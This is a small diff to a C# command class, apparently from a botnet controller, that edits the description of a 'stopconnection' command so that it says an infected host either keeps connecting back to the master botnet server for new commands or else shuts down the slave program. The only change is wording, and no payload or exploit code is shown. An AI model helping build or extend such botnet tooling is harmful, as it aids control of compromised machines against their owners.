@@ -8,7 +8,7 @@ namespace Master.Commands
     {
         public string name { get; } = "stopconnection";
 
-        public string description { get; } = "Stop the infected host from trying to connect to you.\nIt will still connect back to the master botnet server to get new commands; if you specified it.";
+        public string description { get; } = "Stop the infected host from trying to connect to you.\nIt will still connect back to the master botnet server to get new commands; if you specified it, else it will shutdown the slave program.";
 
         public bool isLocal { get; } = false;
 
